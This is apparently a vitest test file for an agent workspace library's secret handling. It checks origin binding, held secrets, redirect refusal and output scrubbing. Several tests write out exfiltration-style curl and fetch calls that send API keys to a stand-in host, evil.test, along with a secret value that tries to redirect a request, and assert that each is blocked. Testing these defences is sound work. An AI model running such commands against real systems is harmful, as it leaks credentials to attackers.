import { existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { beforeAll, describe, expect, it } from 'vitest'
import {
  DeclaredSecretError,
  InvalidNameError,
  NetError,
  type Profile,
  type SecretSpec,
  Secrets,
  Store,
  type Workspace,
  curlCommand,
  hostFactory,
  httpHost,
  request,
  toolInstructions,
  worldTools,
} from '../src/index'
import { newKV } from './backends'

const WORKER = new URL('../dist/worker.node.js', import.meta.url)

beforeAll(() => {
  if (!existsSync(fileURLToPath(WORKER))) {
    throw new Error('build @agex-ts/world first: these tests run its built Node worker')
  }
})

interface Seen {
  url: string
  headers: Record<string, string>
  redirect: string | undefined
}

function fakeFetch(handler: (req: Seen) => Response | Promise<Response>) {
  const seen: Seen[] = []
  const fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const req = {
      url: String(input),
      headers: Object.fromEntries(new Headers(init?.headers).entries()),
      redirect: init?.redirect,
    }
    seen.push(req)
    return handler(req)
  }) as typeof globalThis.fetch
  return { fetch, seen }
}

const SECRETS: Record<string, SecretSpec> = {
  BOUND: { value: 'bound-secret-1', origins: ['https://api.good.test'] },
  FREE: 'free-secret-22',
}

async function open(fetch: typeof globalThis.fetch, extra: Profile = {}): Promise<Workspace> {
  const store = await Store.open(await newKV())
  return store.open('s', {
    profile: {
      secrets: SECRETS,
      commands: { curl: curlCommand({ fetch }) },
      hostObjects: { http: httpHost({ fetch }) },
      code: { worker: { target: 'node', url: WORKER } },
      ...extra,
    },
  })
}

describe('secrets bound to origins', () => {
  it('curl fills a bound secret only for its origins', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch)
    expect((await ws.terminal('curl -H "X-Key: $BOUND" https://api.good.test/x')).exitCode).toBe(0)
    expect(seen[0]?.headers['x-key']).toBe('bound-secret-1')

    const r = await ws.terminal('curl -H "X-Key: $BOUND" https://evil.test/x')
    expect(r.exitCode).toBe(3)
    expect(r.stderr).toBe(
      'curl: (3) URL rejected: secret BOUND may not be sent to https://evil.test',
    )
    expect(seen).toHaveLength(1)
    await ws.close()
  })

  it('an unbound secret goes wherever it is asked to', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch)
    expect((await ws.terminal("curl 'https://anywhere.test/?k=$FREE'")).exitCode).toBe(0)
    expect(seen[0]?.url).toBe('https://anywhere.test/?k=free-secret-22')
    await ws.close()
  })

  it('a secret cannot move a request to another origin', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch, { secrets: { HOSTISH: 'evil.test/x?' } })
    const r = await ws.terminal("curl 'https://$HOSTISH'")
    expect(r.exitCode).toBe(3)
    expect(seen).toHaveLength(0)
    await ws.close()
  })

  it('a request carrying a bound secret follows no redirect', async () => {
    const { fetch, seen } = fakeFetch(
      () => new Response(null, { status: 302, headers: { location: 'https://evil.test/' } }),
    )
    const ws = await open(fetch)
    const r = await ws.terminal('curl -L -H "X-Key: $BOUND" https://api.good.test/x')
    expect(r.exitCode).toBe(47)
    expect(r.stderr).toMatch(/won't follow a redirect while sending a secret/)
    expect(seen[0]?.redirect).toBe('manual')
    await ws.close()
  })

  it('a profile names real origins', async () => {
    const store = await Store.open(await newKV())
    await expect(
      store.open('s', { profile: { secrets: { X: { value: 'v', origins: ['not a url'] } } } }),
    ).rejects.toThrow(InvalidNameError)
    await expect(
      store.open('s', { profile: { secrets: { X: { value: 'v', origins: [] } } } }),
    ).rejects.toThrow(TypeError)
  })
})

describe('http, the host object', () => {
  it('fills secret() references from code, and scrubs what comes back', async () => {
    const { fetch, seen } = fakeFetch(
      (req) => new Response(JSON.stringify({ echoed: req.headers.authorization, n: 3 })),
    )
    const ws = await open(fetch)
    const out = await ws.runCode(`
      const ref = secret('BOUND')
      const r = await http.fetch('https://api.good.test/items', {
        headers: { Authorization: 'Bearer ' + ref },
        as: 'json',
      })
      return [ref, r.status, r.body]
    `)
    expect(out.error).toBeNull()
    expect(seen[0]?.headers.authorization).toBe('Bearer bound-secret-1')
    expect(out.value).toBe('["${BOUND}",200,{"echoed":"Bearer ${BOUND}","n":3}]')
    await ws.close()
  })

  it('refuses a bound secret elsewhere, as an error code can catch', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch)
    const out = await ws.runCode(`
      try {
        await http.fetch('https://evil.test/', { headers: { 'X-Key': secret('BOUND') } })
      } catch (e) {
        return e.name + ': ' + e.message
      }
    `)
    expect(out.value).toBe(
      'NetError: URL rejected: secret BOUND may not be sent to https://evil.test',
    )
    expect(seen).toHaveLength(0)
    await ws.close()
  })

  it('secret() refuses a name the profile does not have', async () => {
    const { fetch } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch)
    const out = await ws.runCode(`secret('NOPE')`)
    expect(out.error?.message).toBe("no secret named 'NOPE'")
    await ws.close()
  })
})

describe('host objects made with the secrets', () => {
  it('a factory builds a client holding a secret the world never sees', async () => {
    const { fetch } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch, {
      hostObjects: {
        api: hostFactory((_ws, { secrets }) => {
          const key = secrets.get('FREE') as string
          return { keyLength: () => key.length, origins: () => secrets.origins('BOUND') }
        }),
      },
    })
    const out = await ws.runCode('return [await api.keyLength(), await api.origins()]')
    expect(out.value).toBe('[14,["https://api.good.test"]]')
    await ws.close()
  })
})

describe('secrets declared without a value', () => {
  const HELD =
    'secret HELD has no value here: the host holds it, so the request must go through a host object that fills it'
  const declared: Profile = {
    secrets: { ...SECRETS, HELD: { origins: ['https://api.held.test'] } },
  }

  it('are listed as a secret with a value is', async () => {
    const { fetch } = fakeFetch(() => new Response('ok'))
    const texts = async (held: SecretSpec) => {
      const ws = await open(fetch, { secrets: { ...SECRETS, HELD: held } })
      const tools = worldTools(ws)
      const out = [...tools.map((t) => t.description), await toolInstructions(ws)]
      await ws.close()
      return out
    }
    const withValue = await texts({ value: 'held-secret-333', origins: ['https://api.held.test'] })
    expect(withValue.join('\n')).toContain('$HELD')
    expect(await texts({ origins: ['https://api.held.test'] })).toEqual(withValue)
  })

  it('give their reference in the shell and in code', async () => {
    const { fetch } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch, declared)
    expect((await ws.terminal('echo "$HELD ${HELD}"')).stdout).toBe('${HELD} ${HELD}\n')
    expect((await ws.runCode(`return secret('HELD')`)).value).toBe('${HELD}')
    await ws.close()
  })

  it('curl refuses a request carrying one, and sends nothing', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch, declared)
    for (const command of [
      'curl -H "X-Key: $HELD" https://api.held.test/x',
      "curl 'https://api.held.test/x?k=$HELD'",
    ]) {
      const r = await ws.terminal(command)
      expect(r.exitCode).toBe(3)
      expect(r.stderr).toBe(`curl: (3) ${HELD}`)
    }
    const elsewhere = await ws.terminal('curl -H "X-Key: $HELD" https://evil.test/x')
    expect(elsewhere.stderr).toBe(
      'curl: (3) URL rejected: secret HELD may not be sent to https://evil.test',
    )
    expect(seen).toHaveLength(0)
    await ws.close()
  })

  it('http.fetch refuses a request carrying one, and sends nothing', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch, declared)
    const out = await ws.runCode(`
      try {
        await http.fetch('https://api.held.test/', { headers: { 'X-Key': secret('HELD') } })
      } catch (e) {
        return e.name + ': ' + e.message
      }
    `)
    expect(out.value).toBe(`NetError: ${HELD}`)
    expect(seen).toHaveLength(0)
    await ws.close()
  })

  it('request() refuses one, and sends nothing', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const secrets = new Secrets({ HELD: { origins: ['https://api.held.test'] } })
    const sent = request(
      { url: 'https://api.held.test/', headers: [['X-Key', 'Bearer ${HELD}']] },
      secrets,
      { fetch },
    )
    await expect(sent).rejects.toThrow(NetError)
    await expect(sent).rejects.toThrow(HELD)
    expect(seen).toHaveLength(0)
  })

  it('a plain host object gets the reference unfilled, to send on', async () => {
    const { fetch } = fakeFetch(() => new Response('ok'))
    const got: unknown[] = []
    const ws = await open(fetch, {
      ...declared,
      hostObjects: {
        relay: {
          fetch: (url: string, init: { headers: Record<string, string> }) => {
            got.push([url, init.headers])
            return 'sent'
          },
        },
      },
    })
    const out = await ws.runCode(`
      return await relay.fetch('https://api.held.test/x', {
        headers: { Authorization: 'Bearer ' + secret('HELD') },
      })
    `)
    expect(out.value).toBe('sent')
    expect(got).toEqual([['https://api.held.test/x', { Authorization: 'Bearer ${HELD}' }]])
    await ws.close()
  })

  it('secrets.get throws for one, and declared() tells it apart', async () => {
    const { fetch } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch, {
      ...declared,
      hostObjects: {
        api: hostFactory((_ws, { secrets }) => ({
          probe: () => {
            const seen: unknown[] = [
              secrets.names(),
              secrets.declared('HELD'),
              secrets.declared('FREE'),
            ]
            try {
              secrets.get('HELD')
            } catch (e) {
              seen.push((e as Error).name)
            }
            return [...seen, secrets.get('FREE'), secrets.origins('HELD')]
          },
        })),
      },
    })
    const out = await ws.runCode('return await api.probe()')
    expect(JSON.parse(out.value as string)).toEqual([
      ['BOUND', 'FREE', 'HELD'],
      true,
      false,
      'DeclaredSecretError',
      'free-secret-22',
      ['https://api.held.test'],
    ])
    expect(() => new Secrets({ HELD: { origins: ['https://a.test'] } }).get('HELD')).toThrow(
      DeclaredSecretError,
    )
    await ws.close()
  })

  it('leave secrets with a value as they were, echo scrubbing included', async () => {
    const { fetch, seen } = fakeFetch((req) => new Response(`echo ${req.headers['x-key']}`))
    const ws = await open(fetch, declared)
    const r = await ws.terminal('curl -H "X-Key: $BOUND" https://api.good.test/x')
    expect(r.exitCode).toBe(0)
    expect(seen[0]?.headers['x-key']).toBe('bound-secret-1')
    expect(r.stdout).toBe('echo ${BOUND}')
    expect(new Secrets(declared.secrets).scrub('free-secret-22 ${HELD}')).toBe('${FREE} ${HELD}')
    await ws.close()
  })

  it('are inherited by a fork', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const ws = await open(fetch, declared)
    const child = await ws.fork('child')
    expect((await child.terminal('echo $HELD')).stdout).toBe('${HELD}\n')
    const r = await child.terminal('curl -H "X-Key: $HELD" https://api.held.test/x')
    expect(r.stderr).toBe(`curl: (3) ${HELD}`)
    expect((await child.runCode(`return secret('HELD')`)).value).toBe('${HELD}')
    expect(seen).toHaveLength(0)
    await child.close()
    await ws.close()
  })

  it('a profile declares one with real origins', async () => {
    const store = await Store.open(await newKV())
    await expect(
      store.open('s', { profile: { secrets: { X: { origins: ['not a url'] } } } }),
    ).rejects.toThrow(InvalidNameError)
    await expect(store.open('s', { profile: { secrets: { X: { origins: [] } } } })).rejects.toThrow(
      TypeError,
    )
    await expect(
      store.open('s', {
        profile: { secrets: { X: { value: 3, origins: ['https://a.test'] } as never } },
      }),
    ).rejects.toThrow(TypeError)
  })
})

describe('interrupting curl', () => {
  it('while it reads a body, the call ends interrupted', async () => {
    let pull!: ReadableStreamDefaultController<Uint8Array>
    let reading!: () => void
    const read = new Promise<void>((resolve) => {
      reading = resolve
    })
    const body = new ReadableStream<Uint8Array>({
      start(c) {
        pull = c
        c.enqueue(new TextEncoder().encode('partial'))
      },
      // Asked for more once curl has taken the first chunk.
      pull() {
        reading()
      },
    })
    const { fetch } = fakeFetch(() => new Response(body))
    const ws = await open(fetch)
    const running = ws.terminal('curl https://slow.test/stream')
    await read
    expect(ws.interrupt()).toBe(true)
    pull.error(new DOMException('aborted', 'AbortError'))
    const r = await running
    expect(r.exitCode).toBe(130)
    await ws.close()
  })
})

describe('secrets read live', () => {
  /** A host's keys, as a person grants and revokes them. */
  function keys() {
    let now: Record<string, SecretSpec> = {}
    return {
      specs: () => now,
      grant(name: string, spec: SecretSpec) {
        now = { ...now, [name]: spec }
      },
      revoke(name: string) {
        const { [name]: _, ...rest } = now
        now = rest
      },
    }
  }
  const KEY = { value: 'live-secret-4444', origins: ['https://api.good.test'] }

  it('a key granted while the session is open is there for the next call, and one revoked is gone', async () => {
    const { fetch, seen } = fakeFetch((req) => new Response(`saw ${req.headers['x-key']}`))
    const live = keys()
    const ws = await open(fetch, { secrets: live.specs })
    const curl = 'curl -s -H "X-Key: $LIVE" https://api.good.test/x'

    expect((await ws.runCode(`secret('LIVE')`)).error?.message).toBe("no secret named 'LIVE'")
    const unbound = { exitCode: 1, stderr: 'LIVE: unbound variable' }
    expect(await ws.terminal('echo "$LIVE"')).toMatchObject(unbound)

    live.grant('LIVE', KEY)
    expect((await ws.terminal(curl)).stdout).toBe('saw ${LIVE}')
    expect(seen.at(-1)?.headers['x-key']).toBe('live-secret-4444')
    const code = await ws.runCode(`
      const r = await http.fetch('https://api.good.test/y', { headers: { 'X-Key': secret('LIVE') } })
      return r.body
    `)
    expect(code.value).toBe('saw ${LIVE}')

    live.revoke('LIVE')
    const sent = seen.length
    expect((await ws.runCode(`secret('LIVE')`)).error?.message).toBe("no secret named 'LIVE'")
    expect(await ws.terminal(curl)).toMatchObject(unbound)
    expect(seen).toHaveLength(sent)
    await ws.close()
  })

  it('the tools describe the secrets there are now', async () => {
    const { fetch } = fakeFetch(() => new Response('ok'))
    const live = keys()
    const ws = await open(fetch, { secrets: live.specs })
    const described = () =>
      worldTools(ws)
        .map((t) => t.description)
        .join('\n')
    expect(described()).not.toContain('LIVE')
    live.grant('LIVE', KEY)
    expect(described()).toContain('$LIVE')
    expect(described()).toContain("secret('LIVE')")
    await ws.close()
  })

  it('checks what the function gives when it changes, refusing the request it would serve', async () => {
    const { fetch, seen } = fakeFetch(() => new Response('ok'))
    const live = keys()
    const ws = await open(fetch, { secrets: live.specs })
    live.grant('LIVE', { value: 'x-secret-5555', origins: ['not a url'] })
    const r = await ws.terminal('curl -s -H "X-Key: $LIVE" https://api.good.test/x')
    expect(r.exitCode).not.toBe(0)
    expect(r.stderr).toContain('secret LIVE: origin "not a url" is not a URL')
    expect(seen).toHaveLength(0)
    await ws.close()
  })

  it('a profile whose function gives a bad secret at open is refused, as a fixed one is', async () => {
    const store = await Store.open(await newKV())
    await expect(
      store.open('s', { profile: { secrets: () => ({ 'bad name': 'x' }) } }),
    ).rejects.toThrow(InvalidNameError)
  })

  it('reads the specs once per request and reuses what it read while they stay the same', () => {
    let calls = 0
    const specs = { LIVE: KEY }
    const secrets = new Secrets(() => {
      calls += 1
      return specs
    })
    expect(secrets.fill('Bearer ${LIVE} ${LIVE}', new URL('https://api.good.test'))).toBe(
      'Bearer live-secret-4444 live-secret-4444',
    )
    expect(calls).toBe(1)
    expect(secrets.names()).toEqual(['LIVE'])
    expect(secrets.scrub('echo live-secret-4444')).toBe('echo ${LIVE}')
  })
})
